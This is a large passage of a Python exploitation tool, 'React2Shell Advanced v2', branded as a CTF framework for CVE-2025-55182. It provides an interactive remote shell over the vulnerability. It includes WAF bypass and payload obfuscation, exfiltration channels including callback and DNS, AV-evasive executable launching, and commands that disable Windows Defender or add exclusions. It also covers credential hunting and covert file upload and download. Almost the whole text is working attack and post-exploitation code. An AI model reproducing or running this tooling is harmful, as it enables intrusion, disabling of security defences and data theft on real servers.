        print(f"  {C}Path:{W} {full}")
        # Check file exists
        if self.target_os=='windows':
            chk=self.execute(f'if exist "{full}" (echo FILE_OK) else (echo FILE_MISSING)')
            if chk and 'FILE_MISSING' in chk:
                print(f"  {R}[!] File not found: {full}{W}");return
        WMIC_CODES={0:'Success',2:'Access Denied',3:'Insufficient Privilege',8:'Unknown Failure',9:'Path Not Found',21:'Invalid Parameter'}
        methods=[]
        if self.target_os=='windows':
            methods=[
                ('cmd /c (full)',f'cmd /c "{full}" {args} 2>&1'),
                ('cmd /c (.\\)',f'cmd /c ".\\{fp}" {args} 2>&1'),
                ('PowerShell',f'powershell -c "& \'{full}\' {args}" 2>&1'),
                ('WMIC',f'wmic process call create "{full} {args}" 2>&1'),
                ('Background',f'start /b "" "{full}" {args} & timeout /t 2 >nul & echo EXEC_STARTED'),
            ]
        else:
            methods=[
                ('Direct',f'"{full}" {args} 2>&1'),
                ('chmod+run',f'chmod +x "{full}" && "{full}" {args} 2>&1'),
                ('sh -c',f'sh -c "\'{full}\' {args}" 2>&1'),
                ('Background',f'nohup "{full}" {args} >/dev/null 2>&1 & echo EXEC_STARTED'),
            ]
        for name,cmd in methods:
            print(f"  {Y}[*] Trying {name}...{W}",end=' ',flush=True)
            o=self.execute(cmd)
            if o and '[-]' not in o:
                if 'ReturnValue' in o:
                    m=re.search(r'ReturnValue\s*=\s*(\d+)',o)
                    if m:
                        rv=int(m.group(1))
                        meaning=WMIC_CODES.get(rv,f'Error {rv}')
                        if rv==0:print(f"{G}process created ✓{W}");return
                        else:print(f"{R}{meaning} (code {rv}){W}");continue
                if 'EXEC_STARTED' in o:print(f"{G}started in background{W}");return
                ol=o.lower()
                if 'virus' in ol or 'threat' in ol or 'quarantine' in ol or 'blocked' in ol:
                    print(f"{R}BLOCKED by AV{W}");print(f"    {o.strip()}");continue
                if o.strip():print(f"{G}got output{W}");print(o);return
                else:print(f"{Y}ran (no output){W}");return
            else:print(f"{R}failed{W}")
        # AV evasion: copy with random name
        if self.target_os=='windows':
            import random,string
            rname='svc'+''.join(random.choices(string.digits,k=4))+'.exe'
            rcopy='c:/users/public/'+rname
            print(f"  {Y}[*] AV-Evade: copy as {rname}...{W}",end=' ',flush=True)
            self.execute(f'copy /Y "{full}" "{rcopy}" >nul 2>&1')
            o=self.execute(f'start /b "" "{rcopy}" {args} & timeout /t 2 >nul & echo EXEC_STARTED')
            if o and 'EXEC_STARTED' in o:
                print(f"{G}started as {rname}{W}");return
            self.execute(f'del /f "{rcopy}" >nul 2>&1')
            print(f"{R}failed{W}")
        print(f"\n{R}[!] All methods failed. Defender is likely blocking.{W}")
        print(f"{Y}  Try: .av | .bg {filepath} | powershell Set-MpPreference -DisableRealtimeMonitoring $true{W}")

    def post_av(self):
        """Check antivirus status."""
        print(f"{Y}[*] Checking AV status...{W}")
        if self.target_os=='windows':
            cmds=[
                ("Defender Status","powershell -c \"Get-MpComputerStatus | Select-Object -Property RealTimeProtectionEnabled,AntivirusEnabled,AMServiceEnabled | Format-List\""),
                ("AV Products","wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState /format:list 2>nul || echo No SecurityCenter2"),
                ("Defender Exclusions","powershell -c \"Get-MpPreference | Select-Object -Property ExclusionPath,ExclusionExtension,ExclusionProcess | Format-List\" 2>nul"),
                ("Defender Processes","tasklist | findstr -i \"MsMpEng msmpeng NisSrv nissrv MpCmdRun\""),
                ("Recent Threats","powershell -c \"Get-MpThreatDetection | Select-Object -First 5 -Property ThreatID,ActionSuccess,Resources | Format-List\" 2>nul"),
            ]
            for label,c in cmds:
                o=self.execute(c)
                if o and '[-]' not in o:
                    lines=[x for x in o.strip().split('\n') if x.strip() and 'cannot find' not in x.lower()]
                    if lines:
                        print(f"  {C}{label}:{W}")
                        for l in lines:print(f"    {l.strip()}")
                else:print(f"  {C}{label}:{W} {R}N/A{W}")
        else:
            cmds=[
                ("AV Processes","ps aux | grep -iE 'clam|sophos|eset|avg|avast|crowdstrike|falcon|carbon' | grep -v grep"),
                ("Security tools","which aa-status apparmor_status sestatus 2>/dev/null"),
                ("SELinux","getenforce 2>/dev/null || echo N/A"),
            ]
            for label,c in cmds:
                o=self.execute(c)
                if o and '[-]' not in o and o.strip():
                    print(f"  {C}{label}:{W}")
                    for l in o.strip().split('\n'):print(f"    {l.strip()}")
                else:print(f"  {C}{label}:{W} {R}none found{W}")

    def post_avoff(self):
        """Try to disable Defender real-time monitoring."""
        if self.target_os!='windows':print(f"{Y}Linux — no Defender{W}");return
        print(f"{Y}[*] Attempting to disable Defender...{W}")
        methods=[
            ('Set-MpPreference','powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true" 2>&1'),
            ('sc config','sc config WinDefend start= disabled 2>&1'),
            ('sc stop','sc stop WinDefend 2>&1'),
            ('Registry','reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1'),
        ]
        for name,cmd in methods:
            print(f"  {Y}[*] {name}...{W}",end=' ',flush=True)
            o=self.execute(cmd)
            if o:
                ol=o.lower()
                if 'access' in ol and 'denied' in ol:print(f"{R}Access Denied (need SYSTEM/Admin){W}")
                elif 'error' in ol or 'fail' in ol:print(f"{R}{o.strip()[:80]}{W}")
                else:print(f"{G}{o.strip()[:80]}{W}")
            else:print(f"{Y}no output (may have worked){W}")
        # Verify
        o=self.execute('powershell -c "(Get-MpComputerStatus).RealTimeProtectionEnabled"')
        if o:
            if 'false' in o.lower():print(f"\n{G}[+] RealTimeProtection is now DISABLED ✓{W}")
            elif 'true' in o.lower():print(f"\n{R}[!] RealTimeProtection still ENABLED — need higher privs{W}")
            else:print(f"\n{Y}[?] Status: {o.strip()}{W}")

    def post_exclude(self,path):
        """Add a Defender exclusion path."""
        if self.target_os!='windows':print(f"{Y}Linux — no Defender{W}");return
        ep=path.replace('\\','/')
        print(f"{Y}[*] Adding exclusion: {ep}{W}")
        o=self.execute(f'powershell -c "Add-MpPreference -ExclusionPath \'\'{ep}\'\' " 2>&1')
        if o:
            ol=o.lower()
            if 'access' in ol and 'denied' in ol:print(f"{R}[!] Access Denied — need Admin{W}")
            elif 'error' in ol:print(f"{R}[!] {o.strip()[:100]}{W}")
            else:print(f"{G}[+] Exclusion may have been added{W}")
        else:print(f"{G}[+] Exclusion added (no error output){W}")
        # Verify
        o=self.execute('powershell -c "(Get-MpPreference).ExclusionPath"')
        if o and '[-]' not in o:print(f"  {C}Current exclusions:{W} {o.strip()}")

    def post_kill(self,target):
        """Kill a process by PID or name."""
        if self.target_os=='windows':
            if target.isdigit():
                o=self.execute(f'taskkill /PID {target} /F')
            else:
                o=self.execute(f'taskkill /IM "{target}" /F')
        else:
            if target.isdigit():
                o=self.execute(f'kill -9 {target}')
            else:
                o=self.execute(f'pkill -9 -f "{target}"')
        if o:print(o)
        else:print(f"{G}[+] Kill command sent{W}")

    def post_fullinfo(self):
        """Comprehensive enumeration."""
        self.post_users()
        self.post_net()
        self.post_ps()
        self.post_services()
        self.post_secrets()
        self.post_persist()
        self.post_software()

    def banner(self):
        print(f"""
{BOLD}{C}╔══════════════════════════════════════════════════════════════╗
║  {G}React2Shell Advanced v2{C} — CTF Exploitation Framework        ║
║  {Y}CVE-2025-55182{C} | Dual Payload | WAF Bypass | Multi-Exfil    ║
╚══════════════════════════════════════════════════════════════╝{W}
  {Y}Target:{W}    {self.target}{f'  {Y}Host:{W} {self.host_header}' if self.host_header else ''}
  {Y}Strategy:{W}  {self.strategy}  {Y}Exfil:{W} {self.exfil_ch}  {Y}Obf:{W} L{self.obf_level}  {Y}JSON-Esc:{W} {self.json_esc}
  {Y}Timeout:{W}   {self.timeout}s  {Y}Debug:{W} {'ON' if DEBUG else 'OFF'}

{BOLD}Commands:{W}
  {G}.safeprobe{W}        Non-RCE vuln check    {G}.rawtest{W} [cmd]    Raw response debug
  {G}.auto{W} [cmd]       Auto-escalate         {G}.waf{W}              Fingerprint WAF
  {G}.strategy{W} A|B     Payload variant        {G}.exfil{W} [ch]      Switch exfil
  {G}.obf{W} N            JS obfuscation 0-4     {G}.jsonesc{W} N       JSON escape 0-2
  {G}.bypass{W} [preset]  WAF bypass preset      {G}.debug{W}            Toggle debug
  {G}.timeout{W} N        Set timeout            {G}.status{W}           Show config
  {G}.host{W} domain      Set Host header        {G}.upload{W} l r       Upload file
  {G}.download{W} path    Download file          {G}.root{W}             Toggle sudo
  {G}.save{W}             Save output

{BOLD}Post-Exploitation:{W}
  {G}.info{W}             Quick system enum      {G}.fullinfo{W}         Full enum (all below)
  {G}.users{W}            User enumeration       {G}.ps{W}               Process list
  {G}.net{W}              Network info           {G}.services{W}         Running services
  {G}.shares{W}           Network shares         {G}.firewall{W}         Firewall rules
  {G}.secrets{W}          Credential hunting     {G}.persist{W}          Persistence check
  {G}.software{W}         Installed software     {G}.cat{W} path         Read file

{BOLD}Execution:{W}
  {G}.exec{W} path [args] Smart exe launcher     {G}.bg{W} cmd           Background run
  {G}.av{W}               AV/Defender status     {G}.kill{W} pid|name    Kill process
  {G}.avoff{W}            Disable Defender RT    {G}.exclude{W} path     Add AV exclusion
  {G}.exit{W}             Exit
""")

    def try_resolve_domain(self):
        """If target is IP, try reverse DNS and offer domain."""
        parsed=urlparse(self.target)
        host=parsed.hostname or ''
        if not is_ip(host):return
        print(f"{Y}[*] Target is an IP ({host}). Resolving domain...{W}")
        domains=resolve_domain(host)
        if domains:
            print(f"{G}[+] Found domain(s): {', '.join(domains)}{W}")
            for d in domains:
                ans=input(f"  Use {C}{d}{W} as Host header? [Y/n] ").strip().lower()
                if ans in ['','y','yes']:
                    self.host_header=d
                    print(f"{G}  Host header set to: {d}{W}")
                    return
            ans=input(f"  Enter domain manually (or press Enter to skip): ").strip()
            if ans:self.host_header=ans;print(f"{G}  Host header set to: {ans}{W}")
        else:
            print(f"{Y}  No domain found via reverse DNS.{W}")
            ans=input(f"  Enter domain manually (or press Enter to skip): ").strip()
            if ans:self.host_header=ans;print(f"{G}  Host header set to: {ans}{W}")

    def run(self):
        self.banner()
        # Auto-resolve domain if target is IP
        if not self.host_header:
            self.try_resolve_domain()
        if getattr(self.args,'bypass',None)=='auto':
            print(f"{Y}[*] Fingerprinting WAF...{W}")
            w=fingerprint_waf(self.session,self.target)
            if w:self.waf_name=w;print(f"{G}[+] Detected: {w}{W}")
            else:print(f"{Y}[*] No known WAF signature{W}")
        # Try both pwd (Linux) and cd (Windows) for init
        print(f"{Y}[*] Connecting...{W}")
        out,resp,err=self._exploit("pwd",timeout=min(50,self.timeout))
        if out and '/' in out and len(out)<200:
            self.current_dir=out.strip().split('\n')[0]
            self.target_os='linux'
            print(f"{G}[+] Connected! OS: Linux  CWD: {self.current_dir}{W}")
        elif out:
            # Got output but not a unix path — try Windows
            self.target_os='windows'
            print(f"{G}[+] Connected! OS: Windows{W}")
        else:
            # pwd failed, try Windows 'cd'
            out2,resp2,err2=self._exploit("cd",timeout=min(50,self.timeout))
            if out2 and ('\\' in out2 or ':' in out2):
                self.target_os='windows'
                self.current_dir=out2.strip().split('\n')[0]
                print(f"{G}[+] Connected! OS: Windows  CWD: {self.current_dir}{W}")
            elif resp or resp2:
                print(f"{Y}[!] Got HTTP response but no output. Try .rawtest or .auto{W}")
            elif err:
                print(f"{Y}[!] {err}. Try .safeprobe or set domain with .host{W}")
        try:
            while True:
                try:
                    pu=f"{BOLD}{R}root{W}" if self.root_mode else f"{BOLD}{G}user{W}"
                    pd=f"{BOLD}{B}{self.current_dir or '~'}{W}"
                    ps=f"{DIM}[S{self.strategy}|{self.exfil_ch}|L{self.obf_level}]{W}"
                    cmd=input(f"{pu}@{BOLD}{C}target{W}:{pd}{ps}$ ").strip()
                    if not cmd:continue
                    if cmd=='.exit':break
                    elif cmd=='.help':self.banner()
                    elif cmd=='.safeprobe':self.safe_probe()
                    elif cmd=='.debug':
                        global DEBUG;DEBUG=not DEBUG;print(f"{Y}Debug {'ON' if DEBUG else 'OFF'}{W}")
                    elif cmd=='.waf':
                        w=fingerprint_waf(self.session,self.target)
                        print(f"{G}Detected: {w}{W}" if w else f"{Y}No WAF signature{W}")
                    elif cmd=='.root':self.root_mode=not self.root_mode;print(f"{Y}Root {'ON' if self.root_mode else 'OFF'}{W}")
                    elif cmd=='.stealth':self.stealth=not self.stealth;print(f"{Y}Stealth {'ON' if self.stealth else 'OFF'}{W}")
                    elif cmd.startswith('.host'):
                        p=cmd.split()
                        if len(p)>1:self.host_header=p[1];print(f"{G}Host header: {self.host_header}{W}")
                        else:print(f"  Current: {self.host_header or '(auto)'}\n  Usage: .host target-domain.com")
                    elif cmd=='.status':
                        print(f"  strategy={self.strategy} exfil={self.exfil_ch} obf=L{self.obf_level} json_esc={self.json_esc}")
                        print(f"  bypass={self.bypass_cfg}\n  timeout={self.timeout}s root={self.root_mode}")
                    elif cmd=='.save':
                        if self.last_output:
                            fn=f"out_{datetime.now().strftime('%H%M%S')}.txt"
                            open(fn,'w').write(self.last_output);print(f"{G}Saved: {fn}{W}")
                    elif cmd.startswith('.timeout'):
                        p=cmd.split();self.timeout=max(10,int(p[1])) if len(p)>1 else self.timeout;print(f"Timeout: {self.timeout}s")
                    elif cmd.startswith('.strategy'):
                        p=cmd.split()
                        if len(p)>1 and p[1] in ['A','B']:self.strategy=p[1];print(f"{G}Strategy: {self.strategy}{W}")
                        else:print("  A = Circulating 3-part ($@0, __proto__:then)\n  B = Original 5-part ($@3, $2:then, map chain)")
                    elif cmd.startswith('.exfil'):
                        p=cmd.split()
                        if len(p)>1 and p[1] in self.EXFIL_CHS:self.exfil_ch=p[1];print(f"{G}Exfil: {self.exfil_ch}{W}")
                        else:print(f"  Available: {', '.join(self.EXFIL_CHS)}")
                    elif cmd.startswith('.bypass'):
                        p=cmd.split()
                        if len(p)>1 and p[1] in PRESETS:self.bypass_cfg=PRESETS[p[1]].copy();print(f"{G}Bypass: {p[1]}{W}")
                        else:print(f"  Available: {', '.join(PRESETS.keys())}")
                    elif cmd.startswith('.obf'):
                        p=cmd.split();self.obf_level=max(0,min(4,int(p[1]))) if len(p)>1 else self.obf_level;print(f"Obf: L{self.obf_level}")
                    elif cmd.startswith('.jsonesc'):
                        p=cmd.split();self.json_esc=max(0,min(2,int(p[1]))) if len(p)>1 else self.json_esc;print(f"JSON-esc: {self.json_esc}")
                    elif cmd.startswith('.auto'):
                        p=cmd.split(None,1);c=p[1] if len(p)>1 else "id"
                        out=self.auto_exploit(c)
                        if out:self.last_output=out;print(out)
                    elif cmd.startswith('.rawtest'):
                        p=cmd.split(None,1);self.raw_test(p[1] if len(p)>1 else "echo TESTPING")
                    elif cmd.startswith('.info') and not cmd.startswith('.info '):
                        print(f"{Y}[*] Quick Enumeration...{W}")
                        if self.target_os=='windows':
                            cmds=[("User","whoami"),("Host","hostname"),("OS","ver"),("IP","ipconfig | findstr IPv4"),("CWD","cd"),("Privs","whoami /priv | findstr Enabled"),("AV","wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName 2>nul || echo N/A")]
                        else:
                            cmds=[("OS","uname -a"),("User","whoami"),("ID","id"),("Host","hostname"),("CWD","pwd"),("Distro","cat /etc/os-release 2>/dev/null | head -2 || echo N/A")]
                        for l,c in cmds:
                            o=self.execute(c)
                            if o and '[-]' not in o and '[!' not in o:
                                lines=[x for x in o.strip().split('\n') if 'cannot find the path' not in x.lower()]
                                clean='\n'.join(lines).strip()
                                if clean:print(f"  {C}{l}:{W} {clean}")
                                else:print(f"  {C}{l}:{W} {R}failed{W}")
                            else:print(f"  {C}{l}:{W} {R}failed{W}")
                    elif cmd=='.fullinfo':self.post_fullinfo()
                    elif cmd=='.users':self.post_users()
                    elif cmd=='.ps':self.post_ps()
                    elif cmd=='.net':self.post_net()
                    elif cmd=='.services':self.post_services()
                    elif cmd=='.shares':self.post_shares()
                    elif cmd=='.firewall':self.post_firewall()
                    elif cmd=='.secrets':self.post_secrets()
                    elif cmd=='.persist':self.post_persist()
                    elif cmd=='.software':self.post_software()
                    elif cmd.startswith('.cat '):
                        p=cmd.split(' ',1);self.post_cat(p[1]) if len(p)>1 else print('Usage: .cat <filepath>')
                    elif cmd.startswith('.bg '):
                        p=cmd.split(' ',1)
                        if len(p)>1:self.post_bg(p[1])
                        else:print('Usage: .bg <command>')
                    elif cmd.startswith('.exec '):
                        p=cmd.split(None,2)
                        if len(p)>1:
                            fp=p[1];args=p[2] if len(p)>2 else ''
                            self.post_exec(fp,args)
                        else:print('Usage: .exec <path> [args]')
                    elif cmd=='.av':self.post_av()
                    elif cmd=='.avoff':self.post_avoff()
                    elif cmd.startswith('.exclude '):
                        p=cmd.split(' ',1)
                        if len(p)>1:self.post_exclude(p[1])
                        else:print('Usage: .exclude <path>')
                    elif cmd.startswith('.kill '):
                        p=cmd.split(None,1)
                        if len(p)>1:self.post_kill(p[1])
                        else:print('Usage: .kill <pid|name>')
                    elif cmd.startswith('.upload') or cmd.startswith('.ul'):
                        p=cmd.split()
                        if len(p)<3:print(f"Usage: .upload <local_path> <remote_path>");continue
                        lp,rp=p[1],p[2]
                        if not os.path.isfile(lp):print(f"{R}Local file not found: {lp}{W}");continue
                        # If remote path is a directory, append filename
                        if rp.endswith('\\') or rp.endswith('/'):rp+=os.path.basename(lp)
                        elif self.target_os=='windows' and ('\\' in rp or '/' in rp) and '.' not in rp.split('\\')[-1].split('/')[-1]:
                            rp=rp.rstrip('\\').rstrip('/')+'\\'+os.path.basename(lp)
                        # Convert Windows paths to forward slashes
                        rp_safe=rp.replace('\\','/') if self.target_os=='windows' else rp
                        data=open(lp,'rb').read()
                        b64=base64.b64encode(data).decode()
                        fsize=len(data)
                        CHUNK=6000  # base64 chars per chunk (4x larger = 4x fewer requests)
                        chunks=[b64[i:i+CHUNK] for i in range(0,len(b64),CHUNK)]
                        print(f"{Y}[*] Uploading {lp} → {rp_safe} ({fsize}B, {len(chunks)} chunks){W}")
                        if self.target_os=='windows':
                            if len(chunks)==1:
                                o=self.execute(f'powershell -c "[IO.File]::WriteAllBytes(\'{rp_safe}\',[Convert]::FromBase64String(\'{b64}\'))"')
                            else:
                                # Use PowerShell Set-Content/Add-Content (no \r\n corruption)
                                tmp=rp_safe+'.b64'
                                failed=False
                                for i,chunk in enumerate(chunks):
                                    if i==0:
                                        ps_cmd=f"powershell -c \"Set-Content -Path '{tmp}' -Value '{chunk}' -NoNewline\""
                                    else:
                                        ps_cmd=f"powershell -c \"Add-Content -Path '{tmp}' -Value '{chunk}' -NoNewline\""
                                    # Retry up to 3 times
                                    for attempt in range(3):
                                        o=self.execute(ps_cmd)
                                        if o and '[-]' in o:
                                            if attempt<2:time.sleep(1)
                                        else:break
                                    else:
                                        print(f"\n{R}Chunk {i+1}/{len(chunks)} failed after 3 retries{W}")
                                        failed=True;break
                                    pct=int((i+1)/len(chunks)*100)
                                    sys.stdout.write(f"\r  [{pct:3d}%] Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
                                print()
                                if not failed:
                                    # Use PowerShell decode instead of certutil (heavily monitored)
                                    # Write to non-.exe extension first to avoid Defender scan-on-create
                                    dat_name=rp_safe.rsplit('.',1)[0]+'.dat' if '.' in rp_safe.split('/')[-1] else rp_safe+'.dat'
                                    o=self.execute(f"powershell -c \"[IO.File]::WriteAllBytes('{dat_name}',[Convert]::FromBase64String((Get-Content '{tmp}' -Raw)))\"")
                                    # Check if .dat was created
                                    chk=self.execute(f'if exist "{dat_name}" (echo DAT_OK) else (echo DAT_FAIL)')
                                    if chk and 'DAT_OK' in chk:
                                        # Rename .dat to original target name
                                        o=self.execute(f'move /Y "{dat_name}" "{rp_safe}" >nul 2>&1')
                                        self.execute(f'del /f "{tmp}" >nul 2>&1')
                                    else:
                                        print(f"{Y}[!] Decode to .dat failed — .b64 file kept at {tmp}{W}")
                                        print(f"{Y}    Manual: powershell [IO.File]::WriteAllBytes('out.dat',[Convert]::FromBase64String((gc '{tmp}' -Raw))){W}")
                        else:
                            if len(chunks)==1:
                                o=self.execute(f"echo '{b64}'|base64 -d > '{rp_safe}'")
                            else:
                                tmp=rp_safe+'.b64'
                                failed=False
                                for i,chunk in enumerate(chunks):
                                    op='>' if i==0 else '>>'
                                    for attempt in range(3):
                                        o=self.execute(f"printf '%s' '{chunk}'{op}'{tmp}'")
                                        if o and '[-]' in o:
                                            if attempt<2:time.sleep(1)
                                        else:break
                                    else:
                                        print(f"\n{R}Chunk {i+1}/{len(chunks)} failed after 3 retries{W}")
                                        failed=True;break
                                    pct=int((i+1)/len(chunks)*100)
                                    sys.stdout.write(f"\r  [{pct:3d}%] Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
                                print()
                                if not failed:
                                    o=self.execute(f"base64 -d '{tmp}' > '{rp_safe}' && rm '{tmp}'")
                        if o and '[-]' not in o:
                            # Verify file size on target
                            if self.target_os=='windows':
                                sz=self.execute(f'powershell -c \"(Get-Item \'{rp_safe}\').Length\"')
                            else:
                                sz=self.execute(f"stat -c%s '{rp_safe}' 2>/dev/null || wc -c < '{rp_safe}'")
                            if sz:
                                try:
                                    remote_sz=int(sz.strip().split()[-1])
                                    if remote_sz==fsize:print(f"{G}[+] Upload verified: {rp} ({fsize}B) ✓{W}")
                                    else:print(f"{Y}[!] Size mismatch: local={fsize}B remote={remote_sz}B{W}")
                                except:print(f"{G}[+] Upload complete: {rp}{W}")
                            else:print(f"{G}[+] Upload complete: {rp}{W}")
                        else:print(f"{Y}[!] Upload may have failed. Check with: dir {rp_safe}{W}")
                    elif cmd.startswith('.download') or cmd.startswith('.dl'):
                        p=cmd.split()
                        if len(p)<2:print("Usage: .download <remote> [local]");continue
                        rp=p[1];lp=p[2] if len(p)>2 else f"dl_{os.path.basename(rp)}"
                        os.makedirs(os.path.dirname(os.path.abspath(lp)) or '.',exist_ok=True)
                        rp_safe=rp.replace('\\','/') if self.target_os=='windows' else rp
                        print(f"{Y}[*] Downloading {rp}...{W}")
                        if self.target_os=='windows':
                            o=self.execute(f'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'{rp_safe}\'))"')
                        else:
                            o=self.execute(f"base64 -w0 '{rp_safe}'")
                        if o and '[-]' not in o and '[!' not in o:
                            try:
                                clean=o.strip().replace('\r','').replace('\n','').replace(' ','')
                                d=base64.b64decode(clean);open(lp,'wb').write(d);print(f"{G}[+] Saved: {lp} ({len(d)}B){W}")
                            except Exception as e:print(f"{R}Decode error: {e}{W}")
                        else:print(f"{R}Failed to read file{W}")
                    elif cmd.startswith('cd '):
                        path=cmd.split(' ',1)[1].strip()
                        if not path:continue
                        if self.target_os=='windows':
                            if path=='..' and self.current_dir:
                                parts=self.current_dir.rstrip('\\').rsplit('\\',1)
                                new_dir=parts[0] if len(parts)>1 else self.current_dir
                                if len(new_dir)==2 and new_dir[1]==':':new_dir+='\\'
                            elif path=='.':
                                new_dir=self.current_dir or ''
                            elif ':\\' in path or path.startswith('\\\\') or ':/' in path or (len(path)==2 and path[1]==':'):
                                new_dir=path if len(path)>2 else path+'\\'
                            elif self.current_dir:
                                new_dir=self.current_dir.rstrip('\\')+'\\'+path
                            else:
                                new_dir=path
                            # Use forward slashes to avoid JSON→JS escaping issues
                            verify_path=new_dir.replace('\\','/')
                            o=self.execute(f'cd /d "{verify_path}" && cd')
                            if o and '[-]' not in o:
                                lines=[x for x in o.strip().split('\n') if x.strip() and 'cannot find' not in x.lower()]
                                if lines:
                                    self.current_dir=lines[-1].strip()
                                    print(f"{G}CWD: {self.current_dir}{W}")
                                else:print(f"{R}Directory not found: {new_dir}{W}")
                            else:print(f"{R}Cannot cd to: {new_dir}{W}")
                        else:
                            o=self.execute(f"cd '{path}' && pwd")
                            if o and '[-]' not in o:
                                lines=[x.strip() for x in o.strip().split('\n') if x.strip().startswith('/')]
                                if lines:
                                    self.current_dir=lines[-1]
                                    print(f"{G}CWD: {self.current_dir}{W}")
                                else:print(f"{R}cd failed{W}")
                            elif o:print(o)
                    else:
                        # Auto-append 2>&1 to capture stderr (security tools often use stderr)
                        run_cmd=cmd
                        if '2>&1' not in cmd and '2>nul' not in cmd and '2>/dev/null' not in cmd:
                            run_cmd=cmd+' 2>&1'
                        out=self.execute(run_cmd);self.last_output=out or ""
                        if out:print(out)
                        else:print(f"{Y}[*] Command ran but produced no output{W}")
                except KeyboardInterrupt:print(f"\n{Y}Use .exit to quit{W}")
                except EOFError:break
                except Exception as e:print(f"{R}Error: {e}{W}")
        finally:
            try:readline.write_history_file(self.hist)
            except:pass
            print(f"\n{G}Session ended.{W}")


# ═══════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════
def main():
    import argparse
    p=argparse.ArgumentParser(description="React2Shell Advanced v2 — CVE-2025-55182",
        formatter_class=argparse.RawDescriptionHelpFormatter,epilog="""
Examples:
  %(prog)s -u URL --safeprobe                     # Check if vulnerable (no RCE)
  %(prog)s -u URL --auto-pwn                      # Full auto-escalation
  %(prog)s -u URL --strategy B                    # lachlan2k original payload
  %(prog)s -u URL -j 2 -o 3 --bypass light        # Evasion mode
  %(prog)s -u URL --exfil callback --callback-url http://IP:PORT
  %(prog)s -u URL -c "id" --debug                  # Single command + debug

Strategies: A (circulating 3-part), B (lachlan2k original 5-part)
Bypass: none, light, medium, generic, heavy, aggressive
Exfil: redirect, redirect_plain, error, callback, dns
""")
    p.add_argument("-u","--url",required=True)
    p.add_argument("-c","--command")
    p.add_argument("-H","--host",help="Custom Host header (use domain when connecting via IP)")
    p.add_argument("--strategy",default="A",choices=['A','B'])
    p.add_argument("--bypass",default="none")
    p.add_argument("--exfil",default="redirect")
    p.add_argument("-o","--obfuscate",type=int,default=0)
    p.add_argument("-j","--json-escape",type=int,default=0)
    p.add_argument("--stealth",action="store_true")
    p.add_argument("--callback-url")
    p.add_argument("--dns-domain")
    p.add_argument("--proxy")
    p.add_argument("--timeout",type=int,default=90)
    p.add_argument("--debug",action="store_true")
    p.add_argument("--auto-pwn",action="store_true")
    p.add_argument("--safeprobe",action="store_true",help="Non-RCE vulnerability check only")
    args=p.parse_args()
    global DEBUG;DEBUG=args.debug
    shell=AdvancedShell(args.url,args)
    if args.safeprobe:
        shell.safe_probe();return
    if args.auto_pwn:
        print(f"{C}{'═'*50}{W}\n  {G}AUTO-PWN MODE{W}\n{C}{'═'*50}{W}")
        print(f"\n{Y}[1/3] Safe probe{W}");shell.safe_probe()
        print(f"\n{Y}[2/3] Raw test (strategy A + B){W}")
        shell.strategy='A';shell.raw_test("id")
        shell.strategy='B';shell.raw_test("id")
        print(f"\n{Y}[3/3] Auto-escalation{W}")
        out=shell.auto_exploit("id")
        if out:print(f"\n{G}OUTPUT:{W}\n{out}")
        print(f"\n{Y}Entering interactive shell...{W}")
        shell.run()
    elif args.command:
        out=shell.execute(args.command)
        if out:print(out)
    else:
        shell.run()

if __name__=="__main__":main()
